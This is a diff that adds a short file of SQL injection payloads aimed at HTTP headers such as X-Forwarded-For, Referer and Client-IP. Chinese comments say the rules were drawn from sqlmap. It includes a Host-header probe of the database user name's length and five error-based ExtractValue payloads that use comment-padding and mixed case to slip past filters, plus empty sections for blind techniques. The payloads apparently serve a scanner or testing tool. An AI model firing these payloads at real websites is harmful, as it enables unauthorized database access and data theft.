@@ -1,0 +1,19 @@
+# 分析sqlmap的注入规则，然后把简单的规则放到这里
+#   github上面有个仓库是bypass，有四个header头，除了注入，还有XSS，RCE等payload
+# X-Client-IP
+# X-Real-IP
+# X-Forwarded-For
+# Referer
+# Client-IP
+# Host: www.baidu.com'or(length(user())=14)or'
+#
+
+127.0.0.1/**/And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+127.0.0.1'/**/And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+127.0.0.1"/**/And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+127.0.0.1')/**/And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+127.0.0.1")/**/And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#
+
+# bool Blind Based
+
+# time blind based
